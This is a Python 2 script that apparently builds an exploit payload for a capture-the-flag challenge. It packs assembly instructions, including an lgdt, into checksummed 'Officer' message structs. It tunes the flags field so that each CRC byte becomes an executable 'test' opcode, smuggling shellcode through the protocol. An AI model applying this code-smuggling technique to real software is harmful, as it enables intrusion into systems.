import os, sys
import struct

"""
	unsigned int header;
	unsigned int ID;
	unsigned int x;
	unsigned int y;
	unsigned int flags;
	unsigned int padding;
	unsigned int distance;
	unsigned int crc;
"""

def CalcCRC(Buffer):
	NumVal = 0
	for i in Buffer:
		NumVal += ord(i)
	return NumVal & 0xffff

def CalcDistance(x1, y1):
	x2 = 88
	y2 = 298

	res = 0
	one = 0x40000000
	x = (x2 - x1)
	y = (y2 - y1)
	x = ((x*x)+(y*y)) & 0xFFFFFFFF

	while(one > x):
		one >>= 2

	while (one != 0):
		if (x >= res + one):
			x = x - (res + one)
			res = res +  2 * one
		res >>= 1
		one >>= 2
 
	return res

def main():
	"""
	OfficerData = [
			[0x0, 0x195, 0xa3],
			[0x0, 0x140, 0xa3],
			[0x0, 0x140, 0xa3],
			[0x0, 0x140, 0xa3],
			[0x0, 0x140, 0xa3],
			[0x0, 0x006a, 0xa3],
			[0x0, 0x150, 0xa3],
			[0x0, 0x144, 0xa3],
			[0x0, 0x15f, 0xa3],
			[0x0, 0x18d, 0xa3],
			[0x0, 0x150, 0xa3],
			[0x0, 0x14c, 0xa3],
			[0x0, 0x158, 0xa3],
			[0x0, 0x15f, 0xa3],

			[0x0, 0x150, 0xa3],
			[0x0, 0x150, 0xa3],
			[0x0, 0x144, 0xa3],
			[0x0, 0x158, 0xa3],
			[0x0, 0x144, 0xa3],

			[0x0, 0x15a, 0xa3],
			[0x0, 0x159, 0xa3],
			[0x0, 0x10e, 0xa3],
			[0x0, 0x11f, 0xa3],

			[0x0, 0x147, 0xa3],
			[0x0, 0x157, 0xa3],
			[0x0, 0x15c, 0xa3],
			[0x0, 0x15b, 0xa3],
			[0x0, 0x15b, 0xa3],
			[0x0, 0x15b, 0xa3],
			[0x0, 0x15b, 0xa3],
			[0x0, 0x15b, 0xa3],
			[0x0, 0x15b, 0xa3],

			[0x0, 0x11e, 0xa3],
			[0x0, 0x117, 0xa3],

			[0x0, 0x15b, 0xa3],
			[0x0, 0x15b, 0xa3],
			[0x0, 0x15b, 0xa3],
			[0x0, 0x15b, 0xa3],

			[0x0, 0x11e, 0xa3],
			[0x0, 0x150, 0xa3],
			[0x0, 0x150, 0xa3],
			[0x0, 0x150, 0xa3],

			[0x0, 0x11e, 0xa3],
			[0x0, 0x15c, 0xa3],
			[0x0, 0x15b, 0xa3],
			[0x0, 0x15b, 0xa3],
			[0x0, 0x15b, 0xa3],
			[0x0, 0x11e, 0xa3],
			[0x0, 0x11e, 0xa3],
			[0x0, 0x150, 0xa3],

			[0x10f, 0x16, 0x00],	#lgdt

			[0x0, 0x11e, 0xa3],
			[0x0, 0x151, 0xa3],
			[0x0, 0x142, 0xa3],
			[0x0, 0x152, 0xa3],
			[0x0, 0x1cf, 0xa3],
			]
	"""
	"""
	OfficerData = [
[0x0, 0x157, 0xa3],
[0x0, 0x195, 0xa3],
[0x204, 0x15a, 0xa3],
[0x204, 0x150, 0xa3],
[0x0, 0x159, 0xa3],
[0x0, 0x10e, 0xa3],
[0x0, 0x153, 0xa3],
[0x0, 0x144, 0xa3],
[0x0, 0x15b, 0xa3],
[0x0, 0x153, 0xa3],
[0x0, 0x15f, 0xa3],
[0x18d, 0x148, 0xa3],
[0x0, 0x148, 0xa3],
[0x0, 0x150, 0xa3],
[0x0, 0x151, 0xa3],
[0x0, 0x151, 0xa3],
[0x0, 0x144, 0xa3],
[0x0, 0x158, 0xa3],
[0x0, 0x144, 0xa3],
[0x0, 0x150, 0xa3],
[0x0, 0x144, 0xa3],
[0x0, 0x159, 0xa3],
[0x0, 0x144, 0xa3],
[0x0, 0x144, 0xa3],
[0x0, 0x15a, 0xa3],
[0x0, 0x152, 0xa3],
[0x0, 0x154, 0xa3],
[0x0, 0x15b, 0xa3],
[0x0, 0x151, 0xa3],
[0x0, 0x15f, 0xa3],
[0x3a, 0x0, 0xa3],
[0x18d, 0x150, 0xa3],
[0x0, 0x15f, 0xa3],
[0x18d, 0x152, 0xa3],
[0x0, 0x150, 0xa3],
[0x0, 0x150, 0xa3],
[0x0, 0x144, 0xa3],
[0x0, 0x158, 0xa3],
[0x0, 0x144, 0xa3],
[0x0, 0x144, 0xa3],
[0x0, 0x150, 0xa3],
[0x0, 0x144, 0xa3],
[0x0, 0x15f, 0xa3],
[0x0, 0x159, 0xa3],
[0x0, 0x107, 0xa3],
[0x0, 0x1aa, 0xa3],
[0x0, 0x106, 0xa3],
[0x0, 0x144, 0xa3],
[0x0, 0x10e, 0xa3],
[0x0, 0x15a, 0xa3],
[0x0, 0x152, 0xa3],
[0x0, 0x152, 0xa3],
[0x0, 0x144, 0xa3],
[0x0, 0x15c, 0xa3],
[0x0, 0x10e, 0xa3],
[0x0, 0x117, 0xa3],
[0x0, 0x10e, 0xa3],
[0x0, 0x150, 0xa3],
[0x0, 0x150, 0xa3],
[0x0, 0x150, 0xa3],
[0x0, 0x10e, 0xa3],
[0x0, 0x15c, 0xa3],
[0x0, 0x15b, 0xa3],
[0x0, 0x15b, 0xa3],
[0x0, 0x15b, 0xa3],
[0x0, 0x10e, 0xa3],
[0x0, 0x10e, 0xa3],
[0x0, 0x150, 0xa3],
[0x0, 0x10e, 0xa3],
[0x0, 0x10e, 0xa3],
[0x0, 0x15f, 0xa3],
[0x10f, 0x16, 0x0],
[0x0, 0x11f, 0xa3],
[0x0, 0x10e, 0xa3],
[0x0, 0x106, 0xa3],
[0x0, 0x151, 0xa3],
[0x0, 0x1cf, 0xa3],
]
	"""
	OfficerData = []
	Lines = sys.stdin.read().split("\n")
	for i in Lines:
		CurLine = i.split()
		if len(CurLine) > 2:
			if CurLine[2] == "lgdt":
				OfficerData.append([0x10f, 0x16, 0x0])
			else:
				Val = int(CurLine[1], 16)
				if len(CurLine[1]) != 4:
					Val += 0x100
				else:
					Val = ((Val >> 8) | (Val << 8)) & 0xffff

				OfficerData.append([0, Val, 0xa3])

	OutData = ""
	oid = 0x170
	Counter = 0
	OfficerMsgID = 1000
	for (x, y, origflags) in OfficerData:
		if Counter == 30:
			TempData = struct.pack("<HHHHHHH", OfficerMsgID, oid, 0x7a, 0, 0xa3, 0, CalcDistance(0, 0))
			TempCRC = CalcCRC(TempData)

			#figure out high byte of flags to offset the CRC instruction to be a test, 0xA9
			flags = 0xa3 | (((0xA9 - TempCRC) & 0xFF) << 8)
			TempData = struct.pack("<HHHHHHH", OfficerMsgID, oid, 0x7a, 0, flags, 0, CalcDistance(0, 0))
			OutData += TempData + struct.pack("<H", CalcCRC(TempData))

			print "[0x%x, 0x%x, 0x%x, 0x%x]," % (oid, 0x7a, 0, 0xa3)
			Counter += 1
			oid += 1
			if (oid & 0xF) >= 8:
				oid &= 0xFFF0
				oid += 0x100

		TempData = struct.pack("<HHHHHHH", OfficerMsgID, oid, x, y, origflags, 0, CalcDistance(x, y))
		TempCRC = CalcCRC(TempData)

		#figure out high byte of flags to offset the CRC instruction to be a test, 0xA9
		flags = origflags | ((0xA9 - TempCRC) & 0xFF) << 8
		TempData = struct.pack("<HHHHHHH", OfficerMsgID, oid, x, y, flags, 0, CalcDistance(x, y))
		OutData += TempData + struct.pack("<H", CalcCRC(TempData))

		print "[0x%x, 0x%x, 0x%x, 0x%x]," % (oid, x, y, origflags)
		#print "[0x%x, 0x%x, 0x%x]," % (x, y, origflags)

		oid += 1
		if (oid & 0xF) >= 8:
			oid &= 0xFFF0
			oid += 0x100

		Counter += 1


	print len(OfficerData)+1

	OutData = OutData[6:]
	open("outdata.bin","w").write(OutData)


main()
